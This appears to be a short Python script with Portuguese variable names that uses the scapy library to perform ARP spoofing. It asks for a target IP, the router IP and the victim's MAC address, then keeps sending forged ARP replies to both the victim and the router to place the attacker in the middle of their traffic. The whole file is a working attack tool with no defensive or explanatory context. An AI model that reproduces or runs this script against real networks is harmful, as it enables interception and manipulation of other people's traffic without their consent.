import scapy.all as scapy
import time

pausa = 4
alvo = input("IP do alvo: ")
roteador = input("IP do roteador: ")
mac = input("MAC da vitima: ")

def atacar(alvo, ip_falso):
    pacote_arp = scapy.ARP(op = 2, pdst = alvo, hwdst = mac, psrc = ip_falso)
    scapy.send(pacote_arp, verbose = False)
  

while True:
    atacar(alvo, roteador)
    atacar(roteador, alvo)
    time.sleep(pausa)